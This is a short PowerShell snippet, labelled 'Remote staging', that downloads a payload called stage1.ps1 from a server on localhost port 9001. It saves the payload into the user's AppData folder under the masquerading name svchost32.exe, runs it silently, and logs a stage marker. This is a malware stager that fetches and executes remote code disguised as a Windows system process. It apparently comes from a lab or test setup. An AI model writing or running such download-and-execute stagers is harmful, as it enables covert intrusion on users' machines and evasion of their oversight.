
# Remote staging
$DownloadUrl = "http://localhost:9001/stage1.ps1"
$DownloadPath = "$env:APPDATA\svchost32.exe"
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $DownloadPath)
Start-Process -FilePath $DownloadPath -ErrorAction SilentlyContinue
Write-Verbose "stage marker 9 reached"
